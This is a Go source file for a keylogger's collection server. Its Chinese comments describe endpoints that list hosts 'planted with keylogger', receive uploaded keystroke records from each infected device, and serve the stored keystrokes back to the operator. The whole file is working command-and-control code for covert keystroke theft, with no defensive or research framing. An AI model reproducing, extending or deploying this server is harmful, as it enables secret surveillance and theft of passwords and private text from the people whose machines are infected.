package main

import (
	"LogServer/database"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
)

type DataUpload struct {
	DeviceID   string  `json:"device_id" binding:"required"`
	DeivceName string  `json:"device_name"`
	Data       KeyData `json:"data" binding:"required"`
}

type KeyData struct {
	Timestamp       int64  `json:"Timestamp" binding:"required"`
	KeystrokeRecord string `json:"KeystrokeRecord"`
}

func setRoutes(r *gin.Engine) {
	r.GET("/v1/beacons", getting)
	r.GET("/v1/:uuid", gettinginfo)
	r.POST("/v1/:uuid/upload_data", dataposting)
}

// ip:port/beacons 						GET 		查看有哪些被种植了keylogger的主机
func getting(c *gin.Context) {
	var valueMap []database.Beacon
	database.GetBeacons(db, &valueMap)

	c.JSON(http.StatusOK, valueMap)
}

// ip:port/v1/uuid 				GET 		查看uuid的键盘数据
func gettinginfo(c *gin.Context) {
	uuid := c.Param("uuid")
	if database.ExistQuerry(db, uuid) {
		var valueMap []database.BeaconData
		database.GetBeaconData(db, &valueMap, uuid)

		c.JSON(http.StatusOK, valueMap)
	} else {
		//c.JSON(http.StatusNoContent, gin.H{
		//	//todo 待完善
		//	"Content": "no content",
		//})
		c.JSON(http.StatusNoContent, "")
	}
}

// ip:port/v1/uuid/upload_data 	POST 		上传键盘数据
func dataposting(c *gin.Context) {
	uuid := c.Param("uuid")

	var json DataUpload //其成员变量必须以大写字母开头（否则写不进去）
	if err := c.ShouldBindJSON(&json); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if !database.ExistQuerry(db, uuid) {
		// 不存在该uuid，则添加
		newBeacon := database.Beacon{DeviceID: json.DeviceID, DeviceName: json.DeivceName, RegisterTime: json.Data.Timestamp}
		if result := db.Create(&newBeacon); result.Error != nil {
			log.Println(result.Error.Error())
			c.JSON(http.StatusBadRequest, gin.H{"error": result.Error.Error()})
			return
		}
	}
	// 更新last_update_time
	beacon := database.Beacon{DeviceID: json.DeviceID}
	db.First(&beacon)

	beacon.LastUpdateTime = json.Data.Timestamp
	db.Save(&beacon)
	// 添加BeaconData
	beaconData := database.BeaconData{Timestamp: json.Data.Timestamp, KeystrokeRecord: json.Data.KeystrokeRecord, BeaconID: uuid, Beacon: beacon}
	//beaconData := database.BeaconData{Timestamp: json.Data.Timestamp, KeystrokeRecord: json.Data.KeystrokeRecord, BeaconID: uuid}
	if result := db.Create(&beaconData); result.Error != nil {
		log.Println(result.Error.Error())
		c.JSON(http.StatusBadRequest, gin.H{"error": result.Error.Error()})
	}

	c.JSON(http.StatusOK, gin.H{"msg": "succeed"})
}
